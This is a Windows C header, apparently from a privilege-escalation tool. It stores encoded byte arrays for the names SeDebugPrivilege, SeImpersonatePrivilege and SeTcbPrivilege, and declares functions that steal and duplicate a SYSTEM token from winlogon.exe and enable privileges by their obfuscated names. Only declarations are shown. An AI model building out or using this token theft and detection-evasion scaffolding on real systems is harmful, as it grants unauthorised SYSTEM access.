#pragma once

#pragma once

#include <windows.h>

// SeDebugPrivilege
static const unsigned char SE_DEBUG_ENC[] = { 0x63, 0x54, 0x76, 0x56, 0x56, 0x40, 0x51, 0x67, 0x4A, 0x50, 0x17, 0x0B, 0x0F, 0x01, 0x02, 0x03 };
// SeImpersonatePrivilege
static const unsigned char SE_IMP_ENC[] = { 0x63, 0x54, 0x7B, 0x5E, 0x44, 0x50, 0x44, 0x44, 0x57, 0x57, 0x00, 0x16, 0x06, 0x34, 0x17, 0x0F, 0x11, 0x01, 0x05, 0x0F, 0x57, 0x54 };
// SeTcbPrivilege
static const unsigned char SE_TCB_ENC[] = { 0x63, 0x54, 0x66, 0x50, 0x56, 0x65, 0x44, 0x5E, 0x4E, 0x50, 0x0D, 0x07, 0x04, 0x01 };



static const unsigned char* privs[] = {
    SE_DEBUG_ENC,
    SE_IMP_ENC
};
static const size_t priv_lens[] = {
    sizeof(SE_DEBUG_ENC),
    sizeof(SE_IMP_ENC)
};

// Retrieves and duplicates a SYSTEM token (e.g., from winlogon.exe)
BOOL GetSystemTokenAndDuplicate(HANDLE* hSystemToken);

// Enables a specific privilege on a given token (using obfuscated name)
BOOL EnablePrivilege(HANDLE hToken, const unsigned char* encryptedPriv, size_t encLen);

// Enables all predefined privileges (e.g., SeDebugPrivilege, SeImpersonatePrivilege)
void EnableAllPrivileges(HANDLE hToken);

// Enable encrypted privilege on current process
BOOL EnableENCPVG(const char* ENC_PRIV);
